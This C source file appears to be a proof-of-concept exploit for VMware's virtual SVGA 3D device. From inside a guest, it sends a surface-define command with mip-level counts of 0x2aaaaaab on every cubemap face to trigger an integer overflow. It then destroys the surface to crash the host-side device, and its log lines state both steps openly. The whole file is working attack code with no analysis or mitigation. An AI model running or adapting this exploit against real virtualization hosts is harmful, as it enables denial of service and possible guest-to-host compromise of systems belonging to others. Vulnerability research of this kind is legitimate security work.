#include <err.h>
#include <stdlib.h>

#include "svga.h"
#include "svga3d_reg.h"

SVGADevice gSVGA;

int main(int argc, char **argv)
{

	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};
	SVGA3dCmdDestroySurface destroy_sid = {0};

	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x258);
	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32);

	hdr.size = 60;
	surface.sid = 0;
	surface.surfaceFlags= SVGA3D_SURFACE_CUBEMAP;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 0x2aaaaaab;
	surface.face[1].numMipLevels = 0x2aaaaaab;
	surface.face[2].numMipLevels = 0x2aaaaaab;
	surface.face[3].numMipLevels = 0x2aaaaaab;
	surface.face[4].numMipLevels = 0x2aaaaaab;
	surface.face[5].numMipLevels = 0x2aaaaaab;

	dsize[0].width  = 2;
	dsize[0].height = 2;
	dsize[0].depth  = 2;

	dsize[1].width  = 2;
	dsize[1].height = 2;
	dsize[1].depth  = 2;

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);

	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWriteWordToFIFO(dsize[1].width);
	VMwareWriteWordToFIFO(dsize[1].height);
	VMwareWriteWordToFIFO(dsize[1].depth);

	warnx("[+] Triggering the integer overflow using SVGA_3D_CMD_SURFACE_DEFINE...");
	VMwareWaitForFB();
	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	hdr.size = 4;
	destroy_sid.sid = 0;

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DESTROY); 
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(destroy_sid.sid);
	warnx("[+] Triggering the crash using SVGA_3D_CMD_SURFACE_DESTROY...");
	VMwareWaitForFB();

	return 0;
}